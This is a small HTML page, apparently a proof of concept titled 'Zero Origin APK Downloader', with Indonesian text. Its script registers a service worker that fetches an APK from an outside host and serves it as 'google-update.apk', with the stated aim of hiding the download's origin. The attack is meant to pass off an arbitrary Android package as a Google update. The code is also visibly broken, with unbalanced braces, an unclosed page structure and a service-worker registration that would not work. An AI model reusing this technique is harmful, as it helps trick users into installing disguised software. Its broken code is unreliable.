<html>
<head>

<body>
  <h1>Zero Origin APK Downloader</h1>
  <button onclick="installSW()">Install & Download (Origin Kosong 100%)</button>

  <script>
  async function installSW() {
    if ('serviceWorker' in navigator) {
      try {
        const reg = await navigator.serviceWorker.register('data:text/javascript,' + encodeURIComponent(`
          self.addEventListener('fetch', event => {
            if (event.request.url.includes('poc.apk')) {
              event.respondWith(
  fetch('https://www.google.com').then(() => {
    return fetch('https://aliothme.github.io/poc.apk').then(r => {
      const h = new Headers(r.headers);
      h.set('Content-Disposition', 'attachment; filename="google-update.apk"');
      return new Response(r.body, {headers: h});
    });
  }).catch(() => fetch('https://aliothme.github.io/poc.apk')) // fallback
);
                })
              );
            }
          });
        `));

        // Trigger download via SW-controlled fetch
        const a = document.createElement('a');
        a.href = 'https://aliothme.github.io/poc.apk?' + Date.now(); // bypass cache
        a.download = 'google-update.apk';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);

        alert('Download dimulai â€” cek download manager: Origin KOSONG atau google-update.apk');
      } catch(e) {
        alert('Error: ' + e);
      }
    }
  }
